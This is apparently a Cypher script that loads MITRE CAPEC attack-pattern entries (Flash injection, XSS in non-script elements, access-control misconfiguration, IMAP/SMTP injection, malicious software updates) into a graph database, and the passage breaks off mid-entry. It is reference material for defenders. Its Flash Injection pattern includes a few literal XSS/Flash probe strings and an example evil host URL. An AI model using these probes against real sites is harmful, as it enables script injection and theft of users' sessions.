CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's session identifiers or other type of credentials"});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the variables used in the flash application"});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the flash application to be remotely controlled"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Execute JavaScript in victim's browser", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current flash application, he can choose to inject JavaScript in the client's DOM and therefore execute cross-site scripting attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker is able to execute a DOM based cross-site scripting attack on the victim."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{local_id: "R.178.1", author: "Stefano Di Paola", title: "Testing Flash Applications", pubdate: "2007", link: "http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf"});
MERGE (:Reference{id: "REF-4", local_id: "R.178.2", title: "OWASP Testing Guide", section: "Testing for Cross site flashing (OWASP-DV-004)", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_Cross_site_flashing_(OWASP-DV-004)"});
CREATE (:AttackPattern{id: 179, name: "Calling Micro-Services Directly", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 132, text: "<div level=\"0\">\n  <p class=\"text\">The target site must use micro-services that interact with the server and one or more of these micro-services must be vulnerable to some other attack pattern.</p>\n</div>"});
CREATE (:Submission{id: 156});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 125});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 31, name: "Discovering, querying, and finally calling micro-services, such as w/ AJAX"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 156, summary: "OrderedDict([('Text', 'An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere. However, these micro-services may not be subject to the same level of security review as other forms of content. For example, a micro-service that posts requests to a server that are turned into SQL queries may not adequately protect against SQL-injection attacks. As a result, micro-services may provide another vector for a range of attacks. It should be emphasized that the presence of micro-services does not necessarily make a site vulnerable to attack, but they do provide additional complexity to a web page and therefore may contain vulnerabilities that support other attack patterns.')])"});
CREATE (:ResourcesRequired{id: 77, text: "<div level=\"0\">\n  <p class=\"text\">The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.</p>\n</div>"});
CREATE (:AttackPattern{id: 18, name: "XSS Targeting Non-Script Elements", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 133, text: "<div level=\"0\">\n  <p class=\"text\">The target client software must allow the execution of scripts generated by remote hosts.</p>\n</div>"});
CREATE (:Submission{id: 157});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 126});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 127});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Examples-Instances, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 32, name: "Embedding Scripts in Non-Script Elements"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 157, summary: "OrderedDict([('Text', [\"This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements.\", 'As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">At least one input is reflected in a non-script element.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path and still used in a non-script element.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker. These parameters are all used in, possibly, client-side non-scripts elements."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe identified potential entry points for XSS vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of the created requests.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">User-controllable input is output back to the browser</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Output to the browser is not encoded to remove executable scripting syntax.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's script string is being reflected verbatim at some point in the web site (if not on the same page). Note that sometimes, the payload might be well encoded in the page, but wouldn't be encoded at all in some other section of the same web page (title, etc.)"});
CREATE (:Outcome{id: 2, type: "Failure", description: "All context-sensitive characters are consistently re-encoded before being sent to the web browser. For example, in a HTML tag element, the payload may not be able to evade the quotes in order to inject another attribute."});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not. Depending on which type of non-script element the payload is injected in, it may be possible to evade the encodings."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.18.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
CREATE (:CVE{id: "CVE-2002-1808", description: "<div level=\"0\">\n  <p class=\"text\">Cross-site scripting (XSS) vulnerability in Meunity Community System 1.1 allows remote attackers to inject arbitrary web script or HTML via JavaScript in an IMG tag when creating a topic.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-6919", description: "<div level=\"0\">\n  <p class=\"text\">Firefox Sage extension 1.3.8 and earlier allows remote attackers to execute arbitrary JavaScript in the local context via an RSS feed with an img tag containing the script followed by an extra trailing \">\", which Sage modifies to close the img element before the malicious script.</p>\n</div>"});
MERGE (:CWE{id: 80});
CREATE (:ResourcesRequired{id: 78, text: "<div level=\"0\">\n  <p class=\"text\">Ability to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine</p>\n</div>"});
CREATE (:AttackPattern{id: 180, name: "Exploiting Incorrectly Configured Access Control Security Levels", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 134, text: "<div level=\"0\">\n  <p class=\"text\">The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..</p>\n</div>"});
CREATE (:Submission{id: 158});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 128});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 129});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 130});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 131});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Description{id: 158, summary: "OrderedDict([('Text', 'An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, \"Accessing Functionality Not Properly Constrained by ACLs\" in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey", description: "<div level=\"0\">\n  <p class=\"text\">The attacker surveys the target application, possibly as a valid and authenticated user.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider the web site for all available links.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Brute force to guess all function names/action with different privileges.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Access control mechanism is present in the system.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Operating modes with different privileges are present in the system.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets a list of functionality and data that can be accessed through the system."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Identify weak points in access control configurations", description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker attempts authenticated access to targeted functions and data.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker attempts unauthenticated access to targeted functions and data.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker attempts indirect and side channel access to targeted functions and data.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Access the function or data bypassing the access control", description: "<div level=\"0\">\n  <p class=\"text\">The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker executes the function or accesses the data not authorized to him.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Functionality is accessible to unauthorized users."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{id: "REF-11", local_id: "R.180.1", author: "Silvio Cesare", title: "Share Library Call Redirection Via ELF PLT Infection", pubdate: "2000", link: "http://www.phrack.org/issues.html?issue=56&id=7"});
MERGE (:Reference{id: "REF-8", local_id: "R.180.2", title: "OWASP Top 10", section: "OWASP Top 10 2007 – Malicious File Execution", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Top_10_2007-A3"});
MERGE (:CWE{id: 732});
CREATE (:ResourcesRequired{id: 79, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 181, name: "Flash File Overlay", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 135, text: "<div level=\"0\">\n  <p class=\"text\">The victim must be tricked into navigating to the attackers' decoy site and performing the actions on the decoy page.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 136, text: "<div level=\"0\">\n  <p class=\"text\">The victim's browser must support invisible Flash overlays.</p>\n</div>"});
CREATE (:Submission{id: 159});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 159, summary: "OrderedDict([('Text', 'An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.')])"});
CREATE (:ResourcesRequired{id: 80, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to force the Flash overlay over the decoy content.</p>\n</div>"});
CREATE (:AttackPattern{id: 182, name: "Flash Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 137, text: "<div level=\"0\">\n  <p class=\"text\">The target must be capable of running Flash applications. In some cases, the victim must follow an attacker-supplied link.</p>\n</div>"});
CREATE (:Submission{id: 160});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 132});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 160, summary: "OrderedDict([('Text', 'An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Find Injection Entry Points", description: "<div level=\"0\">\n  <p class=\"text\">The attacker first takes an inventory of the entry points of the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider the website for all available URLs that reference a Flash application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application has embedded Flash movies.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application does not have embedded Flash movies.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs which has embedded Flash movies and the list of global uninitialized global variables, load variables to external movies."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine the application's susceptibility to Flash injection", description: "<div level=\"0\">\n  <p class=\"text\">Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Test the page using direct load asfunction, getURL,javascript:gotRoot(\"\")///d.jpg</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Test the page using controlled evil page/host, http://example.com/evil.swf</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Test the page using Flash HTML injection, \"'><img src='asfunction:getURL,javascript:gotRoot(\"\")//.jpg' ></p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Test the page using DOM injection, (gotRoot(''))</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Find at least one URL is susceptible to Flash injection."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No URL is susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Inject malicious content into target", description: "<div level=\"0\">\n  <p class=\"text\">Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase</p>\n</div>"});
MERGE (:Reference{local_id: "R.182.1", author: "Stefano Di Paola", title: "Finding Vulnerabilities in Flash Applications", pubdate: "November 15, 2007"});
MERGE (:Reference{local_id: "R.182.2", author: "Rudra K. Sinha Roy", title: "A Lazy Pen Tester's Guide to Testing Flash Applications", link: "http://www.ivizsecurity.com/blog/web-application-security/testing-flash-applications-pen-tester-guide/"});
MERGE (:Reference{local_id: "R.182.3", author: "Peleus Uhley", title: "Creating More Secure SWF Web Application", publisher: "Adobe Systems Incorporated", link: "http://www.adobe.com/devnet/flashplayer/articles/secure_swf_apps.html"});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 697});
CREATE (:ResourcesRequired{id: 81, text: "<div level=\"0\">\n  <p class=\"text\">The attacker may need to be able to serve the injected Flash content, but otherwise no special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 183, name: "IMAP/SMTP Command Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 138, text: "<div level=\"0\">\n  <p class=\"text\">The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 139, text: "<div level=\"0\">\n  <p class=\"text\">The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 140, text: "<div level=\"0\">\n  <p class=\"text\">The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.</p>\n</div>"});
CREATE (:Submission{id: 161});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 161, summary: "OrderedDict([('Text', 'An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.')])"});
MERGE (:Reference{id: "REF-4", local_id: "R.183.1", title: "OWASP Testing Guide", section: "Testing for IMAP/SMTP Injection (OWASP-DV-011)", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OWASP-DV-011)"});
CREATE (:ResourcesRequired{id: 82, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for this attack. However, in most cases, the attacker will need to be a recognized user of the web-mail server.</p>\n</div>"});
CREATE (:AttackPattern{id: 184, name: "Software Integrity Attack", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:Submission{id: 162});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 133});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 33, name: "Software Integrity Attacks"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 162, summary: "OrderedDict([('Text', \"An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.\")])"});
MERGE (:CWE{id: 494});
CREATE (:ResourcesRequired{id: 83, text: "<div level=\"0\">\n  <p class=\"text\">Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.</p>\n</div>"});
CREATE (:AttackPattern{id: 185, name: "Malicious Software Download", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:Submission{id: 163});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 163, summary: "OrderedDict([('Text', 'An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.')])"});
MERGE (:CWE{id: 494});
CREATE (:AttackPattern{id: 186, name: "Malicious Software Update", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:Submission{id: 164});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 134});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Severity"});
CREATE (:Description{id: 164, summary: "OrderedDict([('Text', [\"An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an attacker controlled source. Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an attacker to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity. As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source.\", 'Virtually all software requires frequent updates or patches, giving the attacker immense latitude when structuring the attack, as well as many targets of opportunity. Attacks involving malicious software updates can be targeted or untargeted in reference to a population of users, and can also involve manual and automatic means of payload installation. Untargeted attacks rely upon a mass delivery system such as spamming, phishing, or trojans/botnets to distribute emails or other messages to vast populations of users.', \"Targeted attacks aim at a particular demographic or user population. Corporate Facebook or 